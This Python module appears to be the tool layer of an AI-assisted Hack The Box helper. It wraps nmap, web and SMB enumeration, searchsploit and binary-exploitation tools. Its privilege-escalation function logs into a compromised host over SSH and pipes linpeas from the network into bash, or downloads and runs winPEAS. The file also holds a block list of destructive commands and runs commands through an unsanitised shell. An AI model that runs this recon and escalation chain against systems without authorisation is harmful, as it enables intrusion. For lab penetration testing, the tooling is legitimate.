"""
CYBER-RAG Scanner
Wrappers for common pentesting tools + HTB-specific recon workflow
"""
import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Optional


def _sudo_prefix() -> str:
    """Return 'sudo ' if not already root, empty string if we are root."""
    return "" if os.geteuid() == 0 else "sudo "


# ── Tool availability ──────────────────────────────────────

TOOL_NAMES = [
    "nmap", "feroxbuster", "gobuster", "ffuf", "nikto", "whatweb",
    "searchsploit", "curl", "nc", "sqlmap", "hydra",
    "john", "hashcat", "enum4linux", "smbclient",
    "netexec", "wfuzz", "dirsearch", "sshpass",
]

PWNTOOL_NAMES = [
    "gdb", "r2", "checksec", "ROPgadget", "ropper", "one_gadget",
    "ltrace", "strace", "objdump", "readelf", "strings", "file",
    "ghidra",
]


def check_tools() -> dict[str, bool]:
    return {t: shutil.which(t) is not None for t in TOOL_NAMES}


def check_pwn_tools() -> dict[str, bool]:
    return {t: shutil.which(t) is not None for t in PWNTOOL_NAMES}


# ── Command execution ──────────────────────────────────────

def run_command(cmd: str, timeout: int = 120, cwd: Optional[str] = None) -> dict:
    """Execute a shell command and return structured result."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        return {
            "command": cmd,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "success": result.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {
            "command": cmd,
            "stdout": "",
            "stderr": f"⏱ Command timed out after {timeout}s",
            "returncode": -1,
            "success": False,
        }
    except Exception as exc:
        return {
            "command": cmd,
            "stdout": "",
            "stderr": str(exc),
            "returncode": -1,
            "success": False,
        }


# ── HTB recon workflow ─────────────────────────────────────

def parse_grepable_ports(filepath: str) -> str:
    """Parse a grepable nmap file (-oG) and return comma-separated open ports.
    Mirrors what extractPorts does: grep for N/open, return sorted unique ports.
    """
    ports: list[int] = []
    try:
        with open(filepath) as f:
            for line in f:
                found = re.findall(r'(\d{1,5})/open', line)
                ports.extend(int(p) for p in found)
    except FileNotFoundError:
        return ""
    return ",".join(str(p) for p in sorted(set(ports)))


def htb_recon(machine_name: str, ip: str, work_dir: str) -> dict:
    """Full HTB recon workflow — skips steps whose output files already exist."""
    machine_dir = Path(work_dir).expanduser() / machine_name
    nmap_dir    = machine_dir / "nmap"
    allports    = nmap_dir / "allPorts"
    targeted    = nmap_dir / "targeted"

    # ── Step 1: mkt (always idempotent) ───────────────────
    for d in (nmap_dir, machine_dir / "content", machine_dir / "exploits"):
        d.mkdir(parents=True, exist_ok=True)

    lines: list[str] = [f"[*] Workspace: {machine_dir}", ""]

    # ── Return existing targeted scan if already present ───
    if targeted.exists() and targeted.stat().st_size > 0:
        targeted_out = targeted.read_text()
        ports = parse_grepable_ports(str(allports)) if allports.exists() else ""
        lines.append("[*] Existing scan files found — skipping re-scan.")
        lines.append(f"[*] Open ports (from allPorts): {ports or 'unknown'}")
        lines.append(f"\n[existing] {targeted}\n")
        lines.append(targeted_out[:8000] if len(targeted_out) > 8000 else targeted_out)
        return {
            "output": "\n".join(lines),
            "ports": ports,
            "machine_dir": str(machine_dir),
            "targeted": targeted_out,
            "from_cache": True,
        }

    # ── Step 2: Full port scan ─────────────────────────────
    if allports.exists() and allports.stat().st_size > 0:
        lines.append("[*] allPorts exists — skipping full port scan, re-using it.")
    else:
        cmd1 = f"{_sudo_prefix()}nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv {ip} -oG {allports}"
        lines.append(f"$ {cmd1}")
        r1 = run_command(cmd1, timeout=600, cwd=str(machine_dir))
        scan_out = (r1["stdout"] or r1["stderr"]).strip()
        lines.append(scan_out[:6000] if len(scan_out) > 6000 else scan_out)

    # ── Step 3: extractPorts ───────────────────────────────
    ep = run_command(
        f'zsh -c "source ~/.zshrc 2>/dev/null && extractPorts {allports}"',
        timeout=10,
        cwd=str(machine_dir),
    )
    lines.append(ep["stdout"].strip() if ep["stdout"].strip() else "[extractPorts ran silently]")

    ports = parse_grepable_ports(str(allports))
    if not ports:
        lines.append("\n[!] No open ports found — check if target is reachable or scan timed out.")
        return {"output": "\n".join(lines), "ports": "", "machine_dir": str(machine_dir), "targeted": ""}

    lines.append(f"\n[*] Open ports: {ports}")

    # ── Step 4: Targeted service scan ──────────────────────
    cmd2 = f"nmap -p{ports} -sCV {ip} -oN {targeted}"
    lines.append(f"\n$ {cmd2}")
    r2 = run_command(cmd2, timeout=300, cwd=str(machine_dir))
    targeted_out = (r2["stdout"] or r2["stderr"]).strip()
    lines.append(targeted_out[:8000] if len(targeted_out) > 8000 else targeted_out)

    return {
        "output": "\n".join(lines),
        "ports": ports,
        "machine_dir": str(machine_dir),
        "targeted": targeted_out,
        "from_cache": False,
    }


# ── /etc/hosts management ─────────────────────────────────

def add_hosts_entry(ip: str, hostnames: list[str]) -> dict:
    """Append hostname(s) to /etc/hosts, skipping any already present."""
    try:
        current = Path("/etc/hosts").read_text()
    except Exception:
        current = ""

    new = [h for h in hostnames if h not in current]
    if not new:
        return {
            "command": "", "returncode": 0, "success": True,
            "stdout": f"Already in /etc/hosts: {', '.join(hostnames)}", "stderr": "",
        }

    entry = f"{ip}\t{' '.join(new)}"
    try:
        import subprocess as _sp
        proc = _sp.run(
            ["sudo", "tee", "-a", "/etc/hosts"],
            input=f"\n{entry}\n",
            capture_output=True, text=True, timeout=10,
        )
        return {
            "command": f"echo '{entry}' | sudo tee -a /etc/hosts",
            "stdout": f"Added: {entry}" if proc.returncode == 0 else "",
            "stderr": proc.stderr,
            "returncode": proc.returncode,
            "success": proc.returncode == 0,
        }
    except Exception as exc:
        return {"command": "", "stdout": "", "stderr": str(exc), "returncode": -1, "success": False}


# ── Other scanners ─────────────────────────────────────────

def udp_scan(target: str, ports: str = "161,162,137,138,139,500") -> dict:
    return run_command(f"{_sudo_prefix()}nmap -sU -sV -p {ports} {target}", timeout=300)


def web_enum(url: str, wordlist: str = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt") -> dict:
    if shutil.which("feroxbuster"):
        cmd = f"feroxbuster -u {url} -w {wordlist} -t 50 -q --no-state --depth 2"
    elif shutil.which("gobuster"):
        cmd = f"gobuster dir -u {url} -w {wordlist} -t 40 -q --no-error"
    elif shutil.which("ffuf"):
        cmd = f"ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -s"
    elif shutil.which("dirsearch"):
        cmd = f"dirsearch -u {url} -w {wordlist} -q"
    else:
        return {
            "command": "", "stdout": "No web enum tool found (install feroxbuster/gobuster/ffuf/dirsearch)",
            "stderr": "", "returncode": -1, "success": False,
        }
    return run_command(cmd, timeout=300)


def subdomain_enum(domain: str, ip: Optional[str] = None, wordlist: str = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt") -> dict:
    if not shutil.which("wfuzz"):
        return {"command": "", "stdout": "wfuzz not installed", "stderr": "", "returncode": -1, "success": False}
    target = ip if ip else domain
    cmd = f'wfuzz -c -w {wordlist} -u "http://{target}/" -H "Host: FUZZ.{domain}" --hc 400,404,403 -t 50'
    return run_command(cmd, timeout=300)


def smb_enum(target: str) -> dict:
    if shutil.which("netexec"):
        # netexec is the modern replacement for enum4linux — null session + share enum + RID cycling
        r = run_command(f"netexec smb {target} -u '' -p '' --shares --users 2>/dev/null", timeout=60)
        if r["returncode"] == 0 or r["stdout"].strip():
            return r
    if shutil.which("enum4linux"):
        return run_command(f"enum4linux -a {target}", timeout=120)
    elif shutil.which("smbclient"):
        return run_command(f"smbclient -L //{target} -N", timeout=60)
    return {"command": "", "stdout": "No SMB enum tool found (install netexec/enum4linux/smbclient)", "stderr": "", "returncode": -1, "success": False}


def nikto_scan(url: str) -> dict:
    if not shutil.which("nikto"):
        return {"command": "", "stdout": "nikto not installed", "stderr": "", "returncode": -1, "success": False}
    return run_command(f"nikto -h {url} -maxtime 120 -nointeractive -Format txt", timeout=150)


def privesc_enum(target: str, username: str, password: str = "", os_type: str = "linux") -> dict:
    """Run linpeas (Linux) or winPEAS (Windows) on a compromised target via SSH."""
    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

    if os_type == "linux":
        run_cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null"
    else:
        run_cmd = (
            "certutil -urlcache -f "
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe "
            "C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe"
        )

    if password:
        if not shutil.which("sshpass"):
            manual = (
                f"sshpass not found — run manually:\n"
                f"  scp linpeas.sh {username}@{target}:/tmp/\n"
                f"  ssh {username}@{target} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"
            )
            return {"command": manual, "stdout": manual, "stderr": "", "returncode": 0, "success": True}
        cmd = f"sshpass -p '{password}' ssh {ssh_opts} {username}@{target} '{run_cmd}'"
    else:
        cmd = f"ssh {ssh_opts} {username}@{target} '{run_cmd}'"

    return run_command(cmd, timeout=600)


def search_exploit(term: str) -> dict:
    if not shutil.which("searchsploit"):
        return {"command": "", "stdout": "searchsploit not installed", "stderr": "", "returncode": -1, "success": False}
    return run_command(f"searchsploit '{term}'", timeout=30)


def whatweb(url: str) -> dict:
    if not shutil.which("whatweb"):
        return run_command(f"curl -sI {url}", timeout=30)
    return run_command(f"whatweb -a 3 {url}", timeout=60)


def filter_findings(output: str, command: str = "") -> str:
    """Strip banner/progress noise from tool output, keeping only finding lines."""
    lines = output.splitlines()

    if "feroxbuster" in command:
        # Feroxbuster finding lines: "200  GET  123l  456w  ..."
        found = [l for l in lines if re.match(r'^\s*\d{3}\s+\w+', l)]
        return "\n".join(found) if found else output

    if "wfuzz" in command:
        # Wfuzz result lines: "000001234:   200  87 L  ..."
        found = [l for l in lines if re.match(r'^\d+:', l.strip())]
        return "\n".join(found) if found else output

    if "gobuster" in command:
        # Gobuster finding lines start with "/" or contain "(Status:"
        found = [l for l in lines if l.strip().startswith("/") or "(Status:" in l]
        return "\n".join(found) if found else output

    if "nikto" in command:
        # Nikto finding lines start with "+ "
        found = [l for l in lines if l.strip().startswith("+ ")]
        return "\n".join(found) if found else output

    return output


def format_result(result: dict, max_chars: int = 4000) -> str:
    """Format a command result for display / AI context."""
    cmd = result.get("command", "")
    out = result.get("stdout", "").strip()
    err = result.get("stderr", "").strip()
    combined = filter_findings(out or err or "(no output)", cmd)
    if len(combined) > max_chars:
        half = max_chars // 2
        combined = combined[:half] + f"\n\n[…{len(combined) - max_chars:,} chars omitted…]\n\n" + combined[-half:]
    return f"$ {cmd}\n{combined}"


# ── Binary analysis / RE / Pwn ────────────────────────────

def analyze_binary(path: str) -> dict:
    """Full static survey: file type, protections, ELF headers, interesting strings."""
    if not Path(path).exists():
        return {"command": "", "stdout": f"File not found: {path}", "stderr": "", "returncode": -1, "success": False}

    parts: list[str] = []

    # file
    r = run_command(f"file '{path}'", timeout=10)
    parts.append(f"=== file ===\n{(r['stdout'] or r['stderr']).strip()}")

    # checksec
    if shutil.which("checksec"):
        r = run_command(f"checksec --file='{path}'", timeout=15)
        parts.append(f"\n=== checksec ===\n{(r['stdout'] or r['stderr']).strip()}")
    else:
        # Manual fallback using readelf
        r = run_command(f"readelf -l '{path}' 2>/dev/null | grep -E 'GNU_STACK|GNU_RELRO'", timeout=10)
        parts.append(f"\n=== protections (readelf fallback) ===\n{(r['stdout'] or r['stderr']).strip()}")

    # ELF headers
    r = run_command(f"readelf -h '{path}' 2>/dev/null", timeout=10)
    parts.append(f"\n=== readelf -h ===\n{(r['stdout'] or r['stderr']).strip()}")

    # Sections
    r = run_command(f"readelf -S '{path}' 2>/dev/null | head -40", timeout=10)
    parts.append(f"\n=== sections ===\n{(r['stdout'] or r['stderr']).strip()}")

    # Dynamic imports
    r = run_command(f"readelf -d '{path}' 2>/dev/null | grep -E 'NEEDED|RPATH|RUNPATH'", timeout=10)
    parts.append(f"\n=== dynamic deps ===\n{(r['stdout'] or r['stderr']).strip()}")

    # Symbol table (functions)
    r = run_command(f"nm -D '{path}' 2>/dev/null || nm '{path}' 2>/dev/null | grep -E ' [Tt] | [Uu] '", timeout=10)
    sym_out = (r["stdout"] or r["stderr"]).strip()
    if len(sym_out) > 2000:
        sym_out = sym_out[:2000] + "\n[… truncated …]"
    parts.append(f"\n=== symbols ===\n{sym_out}")

    # Interesting strings
    r = run_command(
        f"strings -n 8 '{path}' | grep -iE "
        r"""'(flag|pass|password|secret|key|token|admin|root|sh|bin/sh|/bin/bash|http|win|system|exec|printf|gets|read|fgets|scanf|strcpy|strcat|sprintf|popen)'""",
        timeout=15,
    )
    str_out = (r["stdout"] or r["stderr"]).strip()
    if len(str_out) > 1500:
        str_out = str_out[:1500] + "\n[… truncated …]"
    parts.append(f"\n=== interesting strings ===\n{str_out}")

    combined = "\n".join(parts)
    return {
        "command": f"analyze_binary {path}",
        "stdout": combined,
        "stderr": "",
        "returncode": 0,
        "success": True,
    }


def disassemble(binary: str, target: str = "main", count: int = 100) -> dict:
    """Disassemble a function or address using r2 (preferred) or objdump fallback."""
    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}

    if shutil.which("r2"):
        # r2 batch mode: analyse all, print disassembly of target function/address
        if target.startswith("0x") or target.lstrip("-").isdigit():
            cmd = f"r2 -A -q -c 'pd {count} @ {target}' '{binary}' 2>/dev/null"
        else:
            cmd = f"r2 -A -q -c 'pdf @ sym.{target} 2>/dev/null || pdf @ {target} 2>/dev/null' '{binary}' 2>/dev/null"
        r = run_command(cmd, timeout=60)
        out = (r["stdout"] or r["stderr"]).strip()
        if out:
            return {**r, "command": cmd}

    # objdump fallback
    if shutil.which("objdump"):
        cmd = f"objdump -M intel -d '{binary}' 2>/dev/null | grep -A {count} '<{target}>:'"
        return run_command(cmd, timeout=30)

    return {"command": "", "stdout": "r2 and objdump not found", "stderr": "", "returncode": -1, "success": False}


def run_r2(binary: str, commands: str, timeout: int = 60) -> dict:
    """Execute radare2 in batch mode with arbitrary commands.

    commands is a semicolon-separated string, e.g. 'aaa; afl; pdf @ main'
    """
    if not shutil.which("r2"):
        return {"command": "", "stdout": "radare2 (r2) not installed", "stderr": "", "returncode": -1, "success": False}
    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}
    # Build -c args from semicolon list
    cmds = [c.strip() for c in commands.split(";") if c.strip()]
    c_args = " ".join(f"-c '{c}'" for c in cmds)
    cmd = f"r2 -A -q {c_args} '{binary}' 2>/dev/null"
    return run_command(cmd, timeout=timeout)


def find_gadgets(binary: str, filter_str: str = "", tool: str = "auto") -> dict:
    """Find ROP gadgets using ROPgadget or ropper (auto-selects best available)."""
    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}

    has_rop = shutil.which("ROPgadget")
    has_ropper = shutil.which("ropper")

    if tool == "auto":
        tool = "ROPgadget" if has_rop else ("ropper" if has_ropper else "none")

    if tool == "ROPgadget" and has_rop:
        cmd = f"ROPgadget --binary '{binary}'"
        if filter_str:
            cmd += f" | grep -iE '{filter_str}'"
        return run_command(cmd, timeout=120)

    if tool == "ropper" and has_ropper:
        cmd = f"ropper -f '{binary}'"
        if filter_str:
            cmd += f" --search '{filter_str}'"
        return run_command(cmd, timeout=120)

    return {
        "command": "", "stdout": "Neither ROPgadget nor ropper found",
        "stderr": "", "returncode": -1, "success": False,
    }


def find_one_gadget(libc_path: str) -> dict:
    """Find one-gadget RCE addresses in a libc binary using one_gadget."""
    if not shutil.which("one_gadget"):
        return {"command": "", "stdout": "one_gadget not installed (gem install one_gadget)", "stderr": "", "returncode": -1, "success": False}
    if not Path(libc_path).exists():
        return {"command": "", "stdout": f"File not found: {libc_path}", "stderr": "", "returncode": -1, "success": False}
    return run_command(f"one_gadget '{libc_path}'", timeout=60)


def trace_binary(binary: str, args: str = "", tool: str = "auto", timeout: int = 30) -> dict:
    """Run binary under ltrace (library calls) or strace (syscalls)."""
    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}

    if tool == "auto":
        tool = "ltrace" if shutil.which("ltrace") else ("strace" if shutil.which("strace") else "none")

    if tool == "ltrace" and shutil.which("ltrace"):
        cmd = f"ltrace -s 256 '{binary}' {args} 2>&1"
    elif tool == "strace" and shutil.which("strace"):
        cmd = f"strace -s 256 '{binary}' {args} 2>&1"
    elif tool == "strace":
        cmd = f"strace -s 256 '{binary}' {args} 2>&1"
    else:
        return {"command": "", "stdout": "ltrace and strace not found", "stderr": "", "returncode": -1, "success": False}

    return run_command(cmd, timeout=timeout)


def debug_gdb(binary: str, commands: str, timeout: int = 30) -> dict:
    """Run GDB in batch mode with a list of commands (newline or semicolon separated).

    Example commands: 'start; x/20wx $rsp; info registers; q'
    """
    if not shutil.which("gdb"):
        return {"command": "", "stdout": "gdb not installed", "stderr": "", "returncode": -1, "success": False}
    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}

    cmds = [c.strip() for c in commands.replace(";", "\n").splitlines() if c.strip()]
    ex_args = " ".join(f'-ex "{c}"' for c in cmds)
    cmd = f"gdb -q -batch {ex_args} '{binary}' 2>&1"
    return run_command(cmd, timeout=timeout)


def cyclic_pattern(length: int = 200, find: str = "") -> dict:
    """Generate or search a de Bruijn cyclic pattern using pwntools.

    If find is set (e.g. '0x6161616c'), returns the offset.
    """
    if find:
        script = f"from pwn import *; print(cyclic_find({find}))"
    else:
        script = f"from pwn import *; print(cyclic({length}).decode())"
    try:
        r = subprocess.run(
            ["python", "-c", script],
            capture_output=True, text=True, timeout=10,
        )
        return {
            "command": script, "stdout": r.stdout.strip(),
            "stderr": r.stderr.strip(), "returncode": r.returncode,
            "success": r.returncode == 0,
        }
    except Exception as exc:
        return {"command": script, "stdout": "", "stderr": str(exc), "returncode": -1, "success": False}


def decompile_func(binary: str, function: str = "main", ghidra_dir: str = "/opt/ghidra") -> dict:
    """Decompile a function using Ghidra headless analyzer.

    Requires Ghidra installed (ghidraRun / analyzeHeadless in PATH or ghidra_dir).
    """
    headless = shutil.which("analyzeHeadless")
    if not headless:
        headless_candidates = [
            f"{ghidra_dir}/support/analyzeHeadless",
            "/usr/share/ghidra/support/analyzeHeadless",
        ]
        for c in headless_candidates:
            if Path(c).exists():
                headless = c
                break

    if not headless:
        return {
            "command": "", "stdout": "Ghidra headless analyzer not found. Install Ghidra and ensure analyzeHeadless is in PATH.",
            "stderr": "", "returncode": -1, "success": False,
        }

    if not Path(binary).exists():
        return {"command": "", "stdout": f"File not found: {binary}", "stderr": "", "returncode": -1, "success": False}

    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        proj = Path(tmpdir) / "proj"
        # Use Ghidra's built-in DecompileFunction script if available
        script_content = f"""\
import ghidra.app.decompiler.DecompInterface as DecompInterface
from ghidra.util.task import ConsoleTaskMonitor

ifc = DecompInterface()
ifc.openProgram(currentProgram)
monitor = ConsoleTaskMonitor()
funcs = [f for f in currentProgram.getFunctionManager().getFunctions(True) if '{function}' in f.getName()]
if funcs:
    res = ifc.decompileFunction(funcs[0], 120, monitor)
    if res.decompileCompleted():
        print(res.getDecompiledFunction().getC())
    else:
        print('Decompilation failed: ' + res.getErrorMessage())
else:
    print('Function not found: {function}')
"""
        script_path = Path(tmpdir) / "DecompFunc.py"
        script_path.write_text(script_content)

        cmd = (
            f"'{headless}' '{proj}' cyberrag_proj "
            f"-import '{binary}' "
            f"-postScript '{script_path}' "
            f"-scriptlog '{tmpdir}/script.log' "
            f"-deleteProject 2>&1"
        )
        r = run_command(cmd, timeout=180)
        # Pull decompiled output from script log if stdout is empty
        script_log = Path(tmpdir) / "script.log"
        if script_log.exists():
            log_content = script_log.read_text()
            if log_content.strip():
                r = {**r, "stdout": log_content}
        return r


# ── Dangerous command detection ────────────────────────────

DANGEROUS_PATTERNS = [
    "rm -rf", "mkfs", "dd if=", "> /dev/",
    ":(){ :", "chmod 777 /", "chown root",
    "iptables -F", "systemctl stop",
]


def is_dangerous(cmd: str) -> bool:
    return any(p in cmd for p in DANGEROUS_PATTERNS)
